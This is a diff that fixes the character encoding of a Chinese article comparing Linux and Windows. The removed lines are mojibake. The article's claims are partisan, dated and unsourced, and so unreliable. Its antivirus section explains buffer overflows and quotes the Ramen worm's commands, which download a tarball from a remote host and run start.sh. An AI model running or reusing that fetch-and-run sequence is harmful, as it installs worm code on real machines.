@@ -1,93 +1,93 @@
-Linux��һ�����ʹ�ú����ɴ�������UNIX����ϵͳ����Ҫ���ڻ���Intel x86ϵ��CPU�ļ�����ϡ�Linuxϵͳ����ȫ������صĳ�ǧ����ĳ���Ա��ƺ�ʵ�ֵģ���Ŀ���ǽ��������κ���Ʒ�������İ�Ȩ����Լ�ġ�ȫ���綼������ʹ�õ�UNIX���ݲ�Ʒ��Windowsͬ����Ҫ���ڻ���Intel x86ϵ��CPU�ļ�����ϡ����Ľ�������һ���Ƚϡ���  
+Linux是一套免费使用和自由传播的类UNIX操作系统，主要用于基于Intel x86系列CPU的计算机上。Linux系统是由全世界各地的成千上万的程序员设计和实现的，其目的是建立不受任何商品化软件的版权所制约的、全世界都能自由使用的UNIX兼容产品。Windows同样主要用于基于Intel x86系列CPU的计算机上。本文将它们作一个比较。　  
 
-����(һ)�����ƪ��  
+　　(一)　编程篇　  
 
-����һ������ϰ������ΪLinus��Linux�ĵ����ߣ���Linux����������ǧ�Ƶ��ļ��У�Ҳ��һ����ΪCredits���ļ���¼����Ҫ��Linux Hacker�ǵ������͵����ʼ���ַ(����б��а�����100������֣�������صĶ���)����û����˵���徿���ж����˲�����Linux�ĸĽ�����һ��Ϸ�����첢û������ʱ������ƶ�ֹͣ���෴ȴ��ΪLinux���������ж����������ڡ���˿�ʼʹ��Linux�����������һ���������Ƶı����֯�������ͨ����������ʱ�˽����Ե����ĳһ������ĸ���������½�չ��������Ӣ���㹻�ã�����һ�������飬��Ϳ��Եõ���֪����ʲô�ط������ܸ��ֵĵ㲦������GPL�Ĵ��ڣ��㻹���Եõ����ŵ�Դ���룬�Ӷ����÷���ѧϰ���ϵ���Դ�����Ÿ���רҵ��˾�Ľ��룬Linux�����ṩ�Ŀ������ߵĹ���ҲԽ��ǿ����TurboLinux�;���ǿ���Ӧ�ó��򿪷��������ṩ�˸��ֿ���Ӧ�ó���Ĺ��ߣ����жԶ��������磺C��C++��Java��Perl��Tcl/tk��Python��Fortran 77�ı�����/���������Լ����ɿ������������Ժ������������ߡ�����Janus Software��˾�����ı���ΪLinux��VB��Phoenix Object Basic������һ�׶��ص���������Linux RAD(Rapid Application Development������Ӧ��������������)�����ۺ���Python����Perl��������������Ե�ǿ���ܣ�ͬʱ���ṩ�����ơ�Visual Basic���������ԡ���ϤWindows������Visual Basic�ı���߶�����˳����ʹ��Phoenix Object Basic��LynuxWorks����˾��VisualLynux���Ժ�΢����Visual C++����������������΢��Visual C++����������֧��Linux����ϵͳ�Ĳ�Ʒ������������LynuxWorks��˾�ġ�BlueCat Linux�����һ�����������Linux 2.2.12�汾��LynuxWorks����˾�������ƴӴ�Visual C++���;߱��˿���Ƕ��ʽ��Linux��Ӧ�ó����������Ƕ��ʽ��Linux��ϵͳ�����൱���ţ��Ѿ��㷺��Ӧ���ڸ�ʽ������ͨ�Ż�����Ʒ��Linux��������κ�Windows�µı��������һƪ��LINUXռ���Ϸ硣  
+　　一般人们习惯于认为Linus是Linux的缔造者，在Linux包含的数以千计的文件中，也有一个名为Credits的文件记录了主要的Linux Hacker们的姓名和电子邮件地址(这个列表中包含了100多个名字，世界各地的都有)，但没有人说得清究竟有多少人参与了Linux的改进。这一游戏到今天并没有随着时间的推移而停止，相反却因为Linux的日益流行而爱好者甚众。因此开始使用Linux就犹如加入了一个高手如云的编程组织。你可以通过互联网随时了解来自地球的某一个角落的该领域的最新进展；如果你的英文足够好，加入一个讨论组，你就可以得到不知来自什么地方的神密高手的点拨。由于GPL的存在，你还可以得到开放的源代码，从而不用发愁学习资料的来源。随着更多专业公司的介入，Linux可以提供的开发工具的功能也越发强大。如TurboLinux就具有强大的应用程序开发环境，提供了各种开发应用程序的工具，具有对多种语言如：C、C++、Java、Perl、Tcl/tk、Python和Fortran 77的编译器/解释器，以及集成开发环境、调试和其他开发工具。再如Janus Software公司开发的被称为Linux版VB的Phoenix Object Basic，它是一套独特的面向对象的Linux RAD(Rapid Application Development，快速应用软件开发工具)。它综合了Python　和Perl等面向对象编程语言的强大功能，同时，提供了类似　Visual Basic　的易用性。熟悉Windows环境下Visual Basic的编程者都可以顺利地使用Phoenix Object Basic。LynuxWorks　公司的VisualLynux可以和微软的Visual C++相媲美，它集成了微软Visual C++开发工具以支持Linux操作系统的产品，它不但兼容LynuxWorks公司的　BlueCat Linux，而且还兼容其他的Linux 2.2.12版本。LynuxWorks　公司甚至声称从此Visual C++　就具备了开发嵌入式　Linux　应用程序的能力。嵌入式　Linux　系统现在相当热门，已经广泛地应用在各式各样的通信基础产品。Linux可以完成任何Windows下的编程任务。这一篇，LINUX占了上风。  
 
-����(��)������ƽ̨ƪ��  
+　　(二)　运行平台篇　  
 
-���������IT����������������������ÿ��IT���̶��������ǵĲ�Ʒ������Ч�ؽ������ǵ�TCO(��ӵ�гɱ�)�������������豸���۾��ٶȻ����ڲ��ϼӿ졣���������ҵģ��һ�˵�����ϴ�����û�о������������������Ƽ���Linux�ɡ���  
+　　在这个IT技术日新月异的年代，尽管每个IT厂商都嚷着他们的产品可以有效地降低我们的TCO(总拥有成本)，可我们手里设备的折旧速度还是在不断加快。如果你肯听我的，我会说这世上从来就没有救世主，还是试试我推荐的Linux吧。　  
 
-����Linux�ǳ�С��������Ч������Ӳ����Linux����С��װ����Ҫ4MB�ڴ棬����Ҳ���������486�����ϰ�װLinux��������������ǽ��Web���������Ҽǵõ�Linux��̳�����ö���386������·�����ͷ���ǽ��Linux�ں�����������ʱװ�غ�ж��Ӳ������������������Ϊ����װ��ȫ�����������򣬾Ϳ�����󻯵�ʹ���ڴ档��֮Linux����ʹ�ϻ��������������ʡ���ǵĲ�������Windows2000 SERVER��P166+64M��������ͬ����ţһ��������ʱ��Ʒ��㡣����һƪ��LINUXռ���Ϸ硣��  
+　　Linux非常小，可以有效地利用硬件。Linux的最小安装仅需要4MB内存，而你也可以在你的486机器上安装Linux并将其用做防火墙或Web服务器。我记得的Linux论坛有人用二手386建立了路由器和防火墙。Linux内核允许在运行时装载和卸载硬件的驱动程序。这样因为不必装载全部的驱动程序，就可以最大化地使用内存。总之Linux可以使老机器获得新生，节省我们的财力。而Windows2000 SERVER在P166+64M下运行如同像蜗牛一样慢，有时会逼疯你。　这一篇，LINUX占了上风。　  
 
-����(��)��Ӳ��֧��ƪ��  
+　　(三)　硬件支持篇　  
 
-�������ڿ���Դ������ص�LINUX�õ�AMD��INTEL��˾�Ĺ�ע����Ϊ�����ҹ�˾��ϣ����64λоƬʱ���ܹ��Ϳ���Դ����Ĳ���ϵͳϵͳ������ϵLINUX�ķ�չ�ٶȼ��죬�������ں˾Ϳ��Կ�����LINUX����������ϵͳ������ӦоƬ������չ����2001���LINUX����ϣ�IBM����ΪLINUX�����ĵ��������׼�WEBSHERE COMMERCE 5.1��HP����ΪLINUX�����ĵ��������׼�HP SECURE OS SOFTWARE FOR Linux������LINUX���Թ㷺������64λоƬ�����У�����Compaq Alpha����SGI MIPS��Sun UltraSparc����WINDOWS���һ���������µ�Linux�ںˡ���2��.52����������ע��ĸĽ�����Iinux�ں˿�ʼ֧�����µ�usB������usB 2.0����ȷ�����ݴ����ٶȴﵽ480Mb/s������ٶ���usBl.1��ߴ����ٶȵ�40����usB 2.0ģ��һ��û�������ڼ����ϵͳ���С����ڸ�Ϊ���е���ʹ��Firewire��׼��ʵ�ָ������ӹ��ܣ�����������Ƶͷ��Ӳ�̵ȵȡ�΢���Ѿ���д��֧��usB 2.0���Ĵ��룬���������µĲ���ϵͳwindows xP��ȴ��֧��USB 2.0������һƪ��LINUXռ���Ϸ硣 
-(��)������ƪ��  
+　　由于开放源代码的特点LINUX得到AMD和INTEL公司的关注。因为这两家公司都希望在64位芯片时代能够和开放源代码的操作系统系统紧密联系LINUX的发展速度急快，从它的内核就可以看出。LINUX比其他操作系统更能适应芯片技术发展。在2001年的LINUX大会上，IBM带来为LINUX制作的电子商务套间WEBSHERE COMMERCE 5.1，HP带来为LINUX制作的电子商务套间HP SECURE OS SOFTWARE FOR Linux。现在LINUX可以广泛运行在64位芯片构架中，包括Compaq Alpha，　SGI MIPS，Sun UltraSparc。而WINDOWS落后一步。　最新的Linux内核——2。.52版中最引人注意的改进就是Iinux内核开始支持最新的usB技术。usB 2.0可以确保数据传输速度达到480Mb/s，这个速度是usBl.1最高传输速度的40倍。usB 2.0模块一般没有内置在计算机系统当中。现在更为流行的是使用Firewire标准来实现高速连接功能，比如连接视频头、硬盘等等。微软已经编写了支持usB 2.0“的代码，但是在最新的操作系统windows xP中却不支持USB 2.0。　这一篇，LINUX占了上风。 
+(四)　网络篇　  
  
-����Linux�����������ǳ�ǿ������TCP/IP��������߼��ġ�Linux�ṩ�˶��ڵ�ǰ��TCP/IPЭ�����ȫ֧�֣����Ұ����˶���һ��Internet��Э��Ipv6��֧�֡�Linux�ں˻�������IP����ǽ���롢IP��α��IP�����������Ƽ����లȫ���ԡ���Щ���Կ��Ժ���Cisco�����Ĺ�˾�ṩ�ĸ߶�·���豸�����������������⣬����Redhat Linux���ṩ��Samba����(������RedHat Linux����)��Linux��������ΪWindows���ͻ����Ĵ�ӡ���ļ�������������������NT���ļ��ʹ�ӡ������������Linux������AppleTalkģ�飬Linux����������Ϊһ��Macintosh�ͻ������ļ��ʹ�ӡ����������Apache�����������Ӧ�÷�Χ����Web����������ϵͳ����Linux�ϣ���Ϳ��������Լ���Intranet����Internet web��������Linux��������һ��Ftp���������һ�������ʼ�������������Լ���POP��IMAP�ʼ�������������Ը�⣬�㻹������Internet����ѻ��һ��Linux��LDAP����������ܳ�Ⱥ�ȶ���APACHE������Ҳ�������������Աѡ��LINUX��ԭ���������û�л���ѡ��UNIX��LINUX�Ǹ���ѡ��΢����IIS���޷���֮ƥ�С�����һƪ��LINUXռ���Ϸ硣 
+　　Linux的组网能力非常强大，它的TCP/IP代码是最高级的。Linux提供了对于当前的TCP/IP协议的完全支持，并且包括了对下一代Internet。协议Ipv6的支持。Linux内核还包括了IP防火墙代码、IP防伪、IP服务质量控制及许多安全特性。这些特性可以和像Cisco这样的公司提供的高端路由设备的特性相媲美。此外，利用Redhat Linux　提供的Samba　组(并不是RedHat Linux独有)，Linux　可以作为Windows　客户机的打印和文件服务器，还可以用做NT的文件和打印服务器。运用Linux包含的AppleTalk模块，Linux甚至可以作为一个Macintosh客户机的文件和打印服务器。让Apache　这个世界上应用范围最广的Web服务器软件系统跑在Linux上，你就可以运行自己的Intranet或者Internet web服务器。Linux还包含了一个Ftp　服务程序、一个电子邮件传输代理程序以及，POP和IMAP邮件服务程序。如果你愿意，你还可以在Internet上免费获得一个Linux的LDAP服务程序。性能超群稳定的APACHE服务器也是许多网络管理员选择LINUX的原因如果我们没有机会选择UNIX，LINUX是个好选择，微软的IIS是无法与之匹敌。　这一篇，LINUX占了上风。 
  
-����(��)���豸����ƪ��  
+　　(五)　设备驱动篇　  
  
-�������ڵ�LINUX��Ӳ���豸��֧�ֲ��ã���Ҿܾ�ʹ�õ�һ����Ҫ�������������򲻺��ҡ����������ں�������2.4������ҪLINUX�����ṩ�̵Ĳ�Ʒ�Ѿ�����ʶ�����¼����ɨ���ǵ����豸��������΢������װ������LINUXռ���·硡��  
+　　早期的LINUX对硬件设备的支持不好，大家拒绝使用的一个重要方面是驱动程序不好找。不过随着内核升级到2.4各个主要LINUX软件提供商的产品已经可以识别象刻录机，扫描仪等新设备。不过和微软件安装驱动，LINUX占了下风　。  
  
-����(��)��UNIX����ƪ��  
+　　(六)　UNIX能力篇　  
  
-����LinuxΪ����û��ṩ��һ���ڼ���ѧϰ��ʹ��Unix����ϵͳ�Ļ��ᡣ����Linux���ɼ�����������ǿ����ģ��������ںܶ෽�������൱�ȶ��ģ��Ӷ�Ϊ�û�ѧϰ��ʹ��Ŀǰ�����������е�Unix����ϵͳ�ṩ�����۵Ļ��ᡣ����������CD-ROM��Ӧ�̺�������˾(��RedHat��TurboLinux)֧��Linux����ϵͳ��Linux��ΪUnixϵͳ�ڸ��˼�����ϵ�һ������Ʒ���������������Щ��Ϊ�����ϵͳ����ˣ����һ���û��ڹ�˾�ϰ��ʱ����Unixϵͳ�ϱ�̣������ڹ�������һλUnix��ϵͳ����Ա�����Ϳ����ڼ��ﰲװһ��Unix�ļ���ϵͳ����Linuxϵͳ���ڼ���ʹ��Linux���ܹ����һЩ�������񡣡�  
+　　Linux为广大用户提供了一个在家里学习和使用Unix操作系统的机会。尽管Linux是由计算机爱好者们开发的，但是它在很多方面上是相当稳定的，从而为用户学习和使用目前世界上最流行的Unix操作系统提供了廉价的机会。现在有许多CD-ROM供应商和软件公司(如RedHat和TurboLinux)支持Linux操作系统。Linux成为Unix系统在个人计算机上的一个代用品，并能用于替代那些较为昂贵的系统。因此，如果一个用户在公司上班的时候在Unix系统上编程，或者在工作中是一位Unix的系统管理员，他就可以在家里安装一套Unix的兼容系统，即Linux系统，在家中使用Linux就能够完成一些工作任务。　  
  
-������һƪ��LINUXռ���Ϸ硡��  
+　　这一篇，LINUX占了上风　。  
  
-����(��)����ƪ��  
+　　(七)性能篇　  
  
-����Linux����ϵͳ�ڶ̶̵ļ���֮�ڵõ��˷ǳ�Ѹ�͵ķ�չ������Linux���е����������Ƿֲ����ġ�Linux������Unix��ȫ�����ܺ����ԡ��򵥵�˵��Linux����������Ҫ���ԣ���  
+　　Linux操作系统在短短的几年之内得到了非常迅猛的发展，这与Linux具有的良好特性是分不开的。Linux包含了Unix的全部功能和特性。简单的说，Linux具有以下主要特性：　  
  
-����1�������ԡ�  
+　　1、开放性　  
  
-������������ָϵͳ��ѭ�����׼�淶���ر�����ѭ����ϵͳ����(OSI)���ʱ�׼������ѭ���ʱ�׼��������Ӳ�������������ܱ˴˼��ݣ��ɷ����ʵ�ֻ�������  
+　　开放性是指系统遵循世界标准规范，特别是遵循开放系统互连(OSI)国际标准。凡遵循国际标准所开发的硬件和软件，都能彼此兼容，可方便地实现互连。　  
  
-����2�����û���  
+　　2、多用户　  
  
-�������û���ָϵͳ��Դ���Ա���ͬ�û�����ӵ��ʹ�ã���ÿ���û����Լ�����Դ(���磺�ļ����豸)���ض���Ȩ�ޣ�����Ӱ�졣Linux��Unix�����ж��û������ԡ���  
+　　多用户是指系统资源可以被不同用户各自拥有使用，即每个用户对自己的资源(例如：文件、设备)有特定的权限，互不影响。Linux和Unix都具有多用户的特性。　  
  
-����3��������  
+　　3、多任务　  
  
-�������������ִ������������Ҫ��һ���ص㡣����ָ�����ͬʱִ�ж�����򣬶��Ҹ�����������л��������Linuxϵͳ����ÿһ������ƽ�ȵط���΢������������CPU�Ĵ����ٶȷǳ��죬�����ǣ�������Ӧ�ó������������ڲ������С���ʵ�ϣ��Ӵ�����ִ��һ��Ӧ�ó����е�һ��ָ�Linux����΢�������ٴ������������֮��ֻ�к̵ܶ�ʱ���ӳ٣��û��Ǹо��������ġ���  
+　　多任务是现代计算机的最主要的一个特点。它是指计算机同时执行多个程序，而且各个程序的运行互相独立。Linux系统调度每一个进程平等地访问微处理器。由于CPU的处理速度非常快，其结果是，启动的应用程序看起来好像在并行运行。事实上，从处理器执行一个应用程序中的一组指令到Linux调度微处理器再次运行这个程序之间只有很短的时间延迟，用户是感觉不出来的。　  
  
-�����������������������ݿ�ORACLE 8.1.6���ԣ���LINUX�µ������ٶȱ���WIN2000 SERVERҪ��35%����һƪ��LINUXռ���Ϸ硣 
-(��)����ƪ��  
+　　经过对最重量级的数据库ORACLE 8.1.6测试，在LINUX下的运行速度比在WIN2000 SERVER要快35%。这一篇，LINUX占了上风。 
+(八)创新篇　  
  
-����Linux�����������������������ͷ����������������ڣ���  
+　　Linux是自由软件，而自由软件和非自由软的区别在于：　  
  
-����1.�����������ǿ��ŵģ���ǧ������˿��Լ��������������ٵ��ҵ����޸�������롣��  
+　　1.　自由软件是开放的，成千上万的人可以检查这个软件，快速地找到并修改其错误码。　  
  
-����2.�������û����԰����Լ�����Ը�Զ���������������������Ҫ���û�Ҳ������ȫ����������Ϊ���ʵķ�ʽ�����Լ���Linux����  
+　　2.　最终用户可以按照自己的意愿自定义自由软件，有特殊需要的用户也可以完全按照他们认为合适的方式定制自己的Linux。　  
  
-����3.����������Ϊ�˷�ֹ�ظ�������ͨ������Դ�����˼������ʡ�ܶ๤��������  
+　　3.　自由软件为了防止重复发明，通过共享源代码和思想来节省很多工作量。　  
  
-����������Щ�����ǲ��Ƕ����뷨�ĺ�������Ī�����������������ˣ�Linux�����������ŵ㣬Ӧ������ҲԽ��Խ�㷺�������Ƕ��ʽLinux��Ӧ���൱���ţ��ѹ㷺Ӧ���ڰ����ʼǱ����ԡ�����װ�á�������ӵ����ڵĸ�ʽ������ͨ�Ż�����Ʒ����Ƕ��ʽ����ϵͳ�������Ϊһ���Ʋ��ɵ����������ƣ����յ��ԡ�ͨѶ���ҵ����Ϊ���Ĵ��ڶ���Ϊһ�塣��ЩҲΪ���뷨�ĺ������ṩ�˸������ķ��ӿռ䡣��������������Ľ��죬û���˴��������ǲ�������ġ������������ʹ��΢���Ŀ������ߣ���һ��ֻ������������Ա��������һƪ��LINUXռ���Ϸ� 
+　　以上这些特性是不是对有想法的好事者有莫大的吸引力？不仅如此，Linux由于自身的优点，应用领域也越来越广泛。如最近嵌入式Linux的应用相当热门，已广泛应用于包括笔记本电脑、连网装置、网络电视等在内的各式各样的通信基础产品，而嵌入式操作系统正日益成为一种势不可挡的流行趋势，最终电脑、通讯、家电会因为它的存在而成为一体。这些也为有想法的好事者提供了更广阔的发挥空间。在梦想就是力量的今天，没有了创新能力是不可想象的。　如果你总是使用微软的开发工具，你一生只能做个操作人员。　。这一篇，LINUX占了上风 
  
-����(��)������ƪ��  
+　　(九)防病毒篇　  
  
-����1998���CIH������ȫ��������Ϊ֮���ӣ���֮�����Ļ���OUTLOOK��������ɯ������ʱ��Ȳ���������IT��ҵ�Լ����������ʧ���ء�����LINUX������������ϵ�һ��Linux��������reman�Ѿ����ֵ�˵�������ǵõ��ò������й����Ϻ�����֮���֣��ϸ��˵��reman�����ܱ���Ϊ������ʵ��������һ�����ϵģ���NIX/Linux�������Ѵ��ڵġ�������������������򡣼�������UNIX/Linux�汾�ж������ٵش������������⡣��һ�δ������͵Ĺ���(morris worm)���������Ѿ�ʮ�����ˣ������ǵȵ����ڲš����֡��ġ���ʵ�����windows 98/NT�Ļ������������Ҳ�Ǻܳ����ġ���  
+　　1998年的CIH病毒让全世界人民为之胆怯，随之而来的基于OUTLOOK传播美莉莎，欢乐时光等病毒更是是IT行业以及相关领域损失惨重。。而LINUX方面关于世界上第一个Linux病毒——reman已经出现的说法，我们得到该病毒的有关资料和样本之后发现，严格地说，reman并不能被称为病毒。实际上这是一个古老的，在NIX/Linux世界早已存在的“缓冲区溢出”攻击程序。几乎所有UNIX/Linux版本中都或多或少地存在这样的问题。第一次此种类型的攻击(morris worm)，到现在已经十多年了，并不是等到现在才“出现”的。事实上针对windows 98/NT的缓冲区溢出攻击也是很常见的。　  
  
-���������������ԭ���ǣ���һ�����޿ռ�Ļ����������˹������ַ������������ڵĴ洢��Ԫ���������������ʧ�ܡ���Ϊ�Զ����������ڶ�ջ���У������������������ʱ�򣬴洢�ڶ�ջ�еĺ������ص�ַҲ�ᱻ���ǴӶ��޷��ӷ�������ĺ�����������(���ص�ַ������һ����Ч�ĵ�ַ)���������������ϵͳһ�㱨�棺��core dump����segment fault�������ص��ǣ�������ǻ���������һ�ξ�����ƵĻ���ָ�����У�������ͨ��������ı䷵�ص�ַ������ָ���Լ���ָ�����У��Ӷ��ı�ó�����������̡���ξ�����Ƶ�ָ��һ���Ŀ���ǣ���/bin/sh����������δ��뱻��Ϊ����shell code����ͨ��������������Եõ�һ��shell�����˶��ѡ����ǣ�����������һ��suid root���򣬵õ��Ľ���һ��root shell�����������Ŀ���Ȩ�Ѿ����֣��˺������κ����鶼�Ǻ����ġ���  
+　　缓冲区溢出的原理是：向一个有限空间的缓冲区拷贝了过长的字符串，覆盖相邻的存储单元，会引起程序运行失败。因为自动变量保存在堆栈当中，当发生缓冲区溢出的时候，存储在堆栈中的函数反回地址也会被覆盖从而无法从发生溢出的函数正常返回(返回地址往往是一个无效的地址)，在这样的情况下系统一般报告：“core dump”或“segment fault”。严重的是：如果覆盖缓冲区的是一段精心设计的机器指令序列，它可能通过溢出，改变返回地址，将其指向自己的指令序列，从而改变该程序的正常流程。这段精心设计的指令一般的目的是：“/bin/sh”，所以这段代码被称为：“shell code”。通过这样的溢出可以得到一个shell，仅此而已。但是，如果被溢出是一个suid root程序，得到的将是一个root shell。这样机器的控制权已经易手，此后发生的任何事情都是合理的。　  
  
-�����������ǻص�reman�������ȶ������ϵ���������ɨ�裬ͨ��������ͨ��©������ϵͳ����ȡrootȨ�ޣ�Ȼ���Դ���������������Լ���ɨ����������������������Red Hat 6.2��������������ɹ������������¹�������  
+　　下面我们回到reman。它首先对网络上的主机进行扫描，通过两个普通的漏洞进入系统，获取root权限，然后从源主机复制自身，以继续扫描网上其他服务器。对于Red Hat 6.2来讲，如果攻击成功，它会做以下工作：　  
  
-����  
+　　  
  
-����mkdir��/usr/src/.poop��cd��/usr/src/.poop  
-����export TERM=vt100  
-����lynx��-source http��//FROMADDR��27374��>��/usr/src/.poop/rame.tgz  
-����cp ramen.tgz��/tmp  
-����gzip��-d ramen.tgz��tar��-xvf ramen.tar��./start.sh  
-����echo Eat Your Ramen��������mail��-s TOADDR��-c �� 
+　　mkdir　/usr/src/.poop；cd　/usr/src/.poop  
+　　export TERM=vt100  
+　　lynx　-source http：//FROMADDR：27374　>　/usr/src/.poop/rame.tgz  
+　　cp ramen.tgz　/tmp  
+　　gzip　-d ramen.tgz；tar　-xvf ramen.tar；./start.sh  
+　　echo Eat Your Ramen！　　　mail　-s TOADDR　-c 　 
  
  
-���������ԣ�remanֻ��һ���Զ����˵Ļ�����������򣬶����Ǻ���ͨ��һ�֡�Ŀǰ��������������Ƿǳ��ձ��һ�ֹ������ڿ���վ�Ը���ϵͳ��©���ķ�������ÿ�ո��¡��������ֹ�����ʽ�����ǲ��ɱ��⣬Ŀǰ���кܶ�Ը����๥���ķ�������һƪ��LINUXռ���Ϸ硣  
+　　很明显，reman只是一个自动化了的缓冲区溢出程序，而且是很普通的一种。目前缓冲区溢出攻击是非常普遍的一种攻击，黑客网站对各类系统的漏洞的发布几乎每日更新。但是这种攻击方式并不是不可避免，目前已有很多对付该类攻击的方案。这一篇，LINUX占了上风。  
  
-����(ʮ)�ȶ�����ƪ��  
+　　(十)稳定能力篇　  
  
-��������Linux�Ļ�������һ�ο����������¡�Linux�ṩ����ȫ���ڴ汣����ÿ�����̶��������Լ��������ַ�ռ��У����Ҳ������������̻��ں�ʹ�õĵ�ַ�ռ䡣�������ں˼�Ҳ���໥���룬����Ϊ�������д�����ĳ���ֻ�ܻٻ��Լ�����˱��ƻ��Ľ��̼���������ʹϵͳ������Linux�ں�Windows98��NT�ڰ�ȫ�ԵĽ�����ռ���Ϸ磬��Windows2000���������ô���أ������ϵͳ��ȫ������ָ����Windows 2000������ϵͳ�����������ӷ���Ĺ���׼�����㣬Linux��Ȼ��Ŀǰ�ȫ�Ĳ���ϵͳ�������ϵͳ��ȫ�����һ�Ԥ�Ƶ��������Windows 2000������ɲ��ԡ����湤������΢����WONDOWS XP�Ƴ����ã����߲��Ҷ�����ۡ�Ŀǰ�Ƚϰ�ȫ�Ĳ���ϵͳ��Ȼ����ҵ�汾��UNIX��Linux�������ϵͳ��ȫ�����ҿ϶�����Ϊ����δ����5���Linux����Ϊ�ȫ�Ĳ���ϵͳ����2005�꣬������ʹ��Linux����һ��ʮ�����׵����顣LINUX�ڱ�ƪռ���Ϸ硣 
+　　运行Linux的机器启动一次可以运行数月。Linux提供了完全的内存保护，每个进程都运行在自己的虚拟地址空间中，并且不会损坏其他进程或内核使用的地址空间。任务与内核间也是相互隔离，即行为不良或编写不良的程序只能毁坏自己。因此被破坏的进程几乎不可能使系统崩溃。Linux在和Windows98和NT在安全性的较量中占有上风，和Windows2000的情况又怎么样呢？资深的系统安全分析家指出：Windows 2000在网络系统，服务器连接方面的工作准备不足，Linux仍然是目前最安全的操作系统。资深的系统安全分析家还预计到今年年底Windows 2000才能完成测试、除虫工作，而微软的WONDOWS XP推出不久，笔者不敢多家评论。目前比较安全的操作系统仍然是商业版本的UNIX和Linux。资深的系统安全分析家肯定地认为：在未来的5年里，Linux将成为最安全的操作系统。到2005年，管理和使用Linux将是一件十分容易的事情。LINUX在本篇占了上风。 
 
-(ʮһ)��������ƪ��  
+(十一)购买能力篇　  
  
-��������һ�����ݻرܵ����⡣��Ϊ�۸�ԭ��ÿ���˶�����ӵ�������Linux��������˼����ϵ�ԭ��������������Ǵ�����һ�ֿ����Ե���������������ģʽ�������״�����Խ����������۸�Խ����һ��ͳ��ʽLinux����һ����ȫ���ŵ�ϵͳ����֧�ָ�����POSIX��׼�����Ŀ��ű�׼��TCP/IP��Internet�����������׼�����ڱ�����ר�е�API(Ӧ�ó���ӿ�)��Э�飬���Լ��ٶԵ�һ��Ӧ�̵������������Ͳ��������ʹ��ר��ϵͳ�������һ�����˴���ֻ�ܼ���ʹ��ԭ����ϵͳ�����̵Ĳ�Ʒ��Ҳ���ǲ�����������ܵͼۣ����ں�����Ҫ�����߶����ѵ��������ƪ��LINUXռ���Ϸ硣��  
+　　这是一个不容回避的问题。因为价格原因，每个人都可以拥有正版的Linux。此外除了技术上的原因，它更大的意义是代表了一种开放性的软件开发及开放模式，并彻底打破了越优秀的软件价格越高这一传统定式Linux还是一个完全开放的系统。它支持各种像POSIX标准这样的开放标准和TCP/IP的Internet工程任务组标准。由于避免了专有的API(应用程序接口)和协议，可以减少对单一供应商的依赖。这样就不会出现像使用专用系统的情况：一旦犯了错误，只能继续使用原来的系统供用商的产品。也就是不会出现先享受低价，而在后期需要付出高额服务费的情况。本篇中LINUX占了上风。　  
  
-����(ʮ��)��װ����ƪ��  
+　　(十二)安装难易篇　  
  
-�������ڵ�LINUX��װ���Ӷ������ָ�Ҫð��ʧ���ݵķ��ա����������ں�������2.4�������ҪLINUX�����ṩ�̵Ĳ�Ʒ��װ�Ѿ���ü򵥡�������΢������װ��ȣ�Linuxռ���·硡  
+　　早期的LINUX安装复杂对于新手更要冒丢失数据的风险。不过随着内核升级到2.4后各个主要LINUX软件提供商的产品安装已经变得简单。不过和微软件安装相比，Linux占了下风　  
  
-����(ʮ��)�ܽ�ƪ��  
+　　(十三)总结篇　  
  
-��������Դ�����Ǵ���������Linuxǰ;����������·�Ǽ��׿����΢����ITҵ������������£���Ȼ��������λ����������һЩLINUX����(��VI LINUX)���ִ�����𡣡�����һ����������һЩLINUX���������ڰ�Linux��XWINDOWS���ĺܺ�ý��Ҳ���������Linux�������������磬Ƕ��ʽ��Ϣ�ҵ�.��΢��ƴ�����ǲ����ǵġ�΢����һ�����壬Linux����Ҫ��ֹ���������ơ���ϲ��Linux����Ҳ���뿴��΢�����£�ֻ�о��������������ߵõ��ô���
+　　开放源代码是大势所趋，Linux前途广阔，但道路是艰苦卓绝。微软在IT业不景气的情况下，仍然保持着两位数增长。而一些LINUX厂商(如VI LINUX)出现大幅亏损。。还有一个问题现在一些LINUX厂商热衷于把Linux的XWINDOWS做的很好媒体也大加宣传，Linux的优势在于网络，嵌入式信息家电.和微软拼桌面是不明智的。微软是一个整体，Linux厂商要防止被各个击破。我喜欢Linux但我也不想看到微软倒下，只有竞争才能是消费者得到好处。
